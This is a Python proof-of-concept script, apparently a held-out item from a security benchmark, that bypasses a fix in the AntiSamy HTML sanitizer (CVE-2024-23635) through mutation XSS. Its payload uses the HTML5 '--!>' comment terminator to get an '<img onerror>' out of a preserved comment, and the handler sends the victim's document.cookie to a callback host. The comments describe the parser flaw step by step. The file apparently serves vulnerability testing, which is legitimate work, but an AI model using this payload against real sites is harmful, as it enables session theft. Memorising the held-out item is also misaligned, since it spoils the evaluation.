#!/usr/bin/env python3
"""[HELD-OUT] CVE-2024-23635 residual -- the BANG-comment terminator preserved-comment mXSS that
bypasses the CVE-2023-43643 (AntiSamy 1.7.4) fix.

Same sink (`new AntiSamy().scan(html, antisamy.xml, DOM).getCleanHTML()`, preserveComments=true), same
exfil channel as the seed. The 1.7.4 fix (AntiSamyDOMScanner / MagicSAXFilter raw-text handling +
neko-htmlunit 3.6.0) closed the `</noscript>`-in-comment breakout, but it did NOT cover the HTML5
"bang comment" terminator `--!>`. neko-htmlunit 3.6.0 still mis-parses where a comment started with
`<!--` ends when it meets `--!>`, so the `<img src=x onerror=...>` that follows `--!>` escapes the
PRESERVED comment as a LIVE element in AntiSamy 1.7.4's sanitized output -> it executes in the browser
on load -> flag exfiltrated. The 1.7.4 fix never handled this comment-ending case -> INCOMPLETE FIX.

Vector = AntiSamy regression test `testBangCommentsWhenPreservingComments`, added with the 1.7.5 fix.

On V2 (AntiSamy 1.7.5, the CVE-2024-23635 fix) the neko-htmlunit 3.11.1 bump (comment-ending parse
fixed) plus the ASHTMLSerializer / MagicSAXFilter changes keep the `<img>` inside the preserved
comment -> the residual is neutralized -> BLOCKED.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# Benign canary variant of the upstream `<!--<div/>--!><img src=x onerror=mxss(1)> <li>--></p>`
# regression payload: the `--!>` bang-comment terminator makes neko 3.6.0 (bundled in 1.7.4) treat
# the entire comment + img as ONE comment node. The comment is preserved (preserveComments=true) and
# serialized verbatim including the unsanitized <img onerror>. In the browser, the HTML5 parser's
# "comment end bang" state sees `--!>` as a comment close, so the <img onerror> ESCAPES the comment
# and EXECUTES (mXSS). onerror reads the victim cookie and posts it to the callback.
# Wrapped in <div> so the comment sits inside an element (root-level comments are dropped before
# preserveComments can preserve them; wrapping matches how comment-preserving apps embed UGC).
BYPASS_PAYLOAD = (
    "<div><!--<div/>--!>"
    "<img src=x onerror=\"document.location='" + CB + "'+document.cookie\"> <li>--></p></div>"
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 bang-comment residual on `version`; return the callback dump (flag on V1)."""
    return run_payload(BYPASS_PAYLOAD, version, mode="load")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
